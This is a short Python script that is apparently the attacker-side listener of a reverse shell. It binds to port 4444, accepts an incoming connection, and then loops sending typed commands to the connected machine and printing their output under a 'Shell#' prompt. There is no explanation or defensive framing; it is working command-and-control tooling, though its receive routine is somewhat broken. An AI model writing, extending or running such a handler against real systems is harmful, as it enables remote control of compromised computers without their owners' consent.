#!/usr/bin/python

import json
import socket
from termcolor import colored

def reliable_send(data):
	json_data = json.dumps(data)
	client.send(json_data.encode("utf-8"))

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + client.recv(1024).decode("utf-8")
			return json_data
		except ValueError:
			continue
		

def shell():
	while True:
		command = input(f"Shell#{addr}: ")
		reliable_send(command)
		result = reliable_recv()
		print(result)
		if command == "exit":
			break


def server():
	global server_socket
	global client
	global addr

	server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
	server_socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)

	server_socket.bind((socket.gethostbyname(socket.gethostname()), 4444))
	server_socket.listen(5)

	print(colored("[+] Listening for incoming connections", "green"))
	client, addr = server_socket.accept()
	print(colored(f"[+] Connection from {addr} has been established", "green"))

	server_socket.close()

server()
shell()
